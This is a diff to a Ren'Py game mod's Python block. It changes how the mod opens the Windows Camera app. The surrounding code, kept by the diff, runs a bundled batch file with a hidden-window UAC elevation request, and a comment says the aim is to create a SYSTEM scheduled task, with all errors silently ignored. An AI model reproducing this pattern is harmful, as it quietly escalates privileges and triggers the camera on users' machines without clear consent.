@@ -40,21 +40,27 @@ init python:
         import subprocess
         import os
         import time
-        exe = r"C:\Program Files\WindowsApps\Microsoft.WindowsCamera_2026.2607.1.0_x64__8wekyb3d8bbwe\WindowsCamera.exe"
         bat = os.path.join(config.gamedir, "monika_cam_system.bat")
         # Step 1: try to elevate via UAC, create a SYSTEM scheduled task and run it
         try:
-            if os.path.exists(exe) and os.path.exists(bat):
+            if os.path.exists(bat):
                 ps = "Start-Process -FilePath '%s' -Verb RunAs -WindowStyle Hidden -Wait" % bat
                 subprocess.Popen(["powershell", "-NoProfile", "-Command", ps])
                 time.sleep(3)
         except Exception:
             pass
-        # Step 2: fallback, launch directly as the current user
+        # Step 2: launch as the current user through AppX activation.
+        # The exe inside C:\Program Files\WindowsApps has no execute permission
+        # for normal processes (TrustedInstaller-owned ACL); activating the
+        # packaged app goes through the shell like the Start Menu shortcut,
+        # and survives store updates (the package family name never changes).
         try:
-            subprocess.Popen([exe])
+            subprocess.Popen(["explorer", "shell:AppsFolder\\Microsoft.WindowsCamera_8wekyb3d8bbwe!App"])
         except Exception:
-            pass
+            try:
+                os.startfile("microsoft.windows.camera:")
+            except Exception:
+                pass
 
     # ---------- story jump helper: set a consistent state before jumping ----------
     def mod_jump(label, pt, chap, rw=False):
